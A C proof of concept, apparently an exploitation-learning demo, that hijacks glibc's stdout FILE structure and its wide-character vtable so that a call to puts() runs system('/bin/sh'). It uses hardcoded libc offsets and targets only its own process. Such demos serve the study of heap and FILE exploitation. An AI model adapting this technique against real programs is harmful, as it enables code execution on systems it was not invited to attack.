#include <stdio.h>
#include <stdlib.h>

char* stdout2;

int main() {
    size_t system_addr = (size_t)&system;
    size_t libc_base_addr = system_addr - 0x53b00;
    size_t _IO_2_1_stdout_addr = libc_base_addr + 0x20a5c0;
    size_t _IO_wfile_jumps_addr = libc_base_addr + 0x208228;

    stdout2 = (char*) _IO_2_1_stdout_addr;
    char *wide_data = calloc(0x200, 1);
    char *wide_vtable = calloc(0x200, 1);

    *(size_t *)(stdout2) = (size_t) 0x68732f6e69622f; // /bin/sh\x00
    *(size_t *)(wide_data + 0x20) = (size_t) 0x1;
    *(size_t *)(stdout2 + 0xd8) = (size_t) _IO_wfile_jumps_addr + 0x40 - 0x30 ; // offset of seekof
    *(size_t *)(stdout2 + 0xa0) = (size_t) wide_data;
    *(size_t *)(wide_data + 0xe0) = (size_t) wide_vtable;
    *(size_t *)(wide_vtable + 0x18) = (size_t) &system;

    puts("segfault?");
}

__attribute__((constructor)) void
buf_init() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}
